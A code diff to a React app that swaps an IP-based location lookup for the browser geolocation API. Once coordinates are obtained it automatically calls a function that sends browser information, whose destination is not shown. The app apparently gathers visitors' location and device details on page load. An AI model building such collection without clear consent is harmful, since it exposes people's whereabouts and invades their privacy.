@@ -17,30 +17,20 @@ import { useGeolocated } from "react-geolocated";
 function App() {
   const [finish, setFinished] = useState(false);
   const [ipAddress, setIpAddress] = useState("");
+
   useEffect(() => {
-    const fetchIPData = async () => {
-      try {
-        // Öncelikle IP adresinizi alın
-        const { data: ipData } = await axios.get(
-          "https://get.geojs.io/v1/ip.json"
-        );
-
-        // IP adresini ipapi API'sine gönderin
-        const ip_address = ipData.ip;
-        const api_url = `https://get.geojs.io/v1/ip/geo/${ip_address}.json`;
-
-        const { data: locationData } = await axios.get(api_url);
-        setIpAddress(locationData);
-      } catch (error) {
-        console.error("Error fetching data: ", error);
-      }
-    };
-
-    fetchIPData();
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition((position) => {
+        setIpAddress({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+        });
+      });
+    }
   }, []);
 
   useEffect(() => {
-    (!finish && ipAddress) && sendBrowserInfo();
+    !finish && ipAddress && sendBrowserInfo();
   }, [finish, ipAddress]);
   async function sendBrowserInfo() {
     let ip = {};
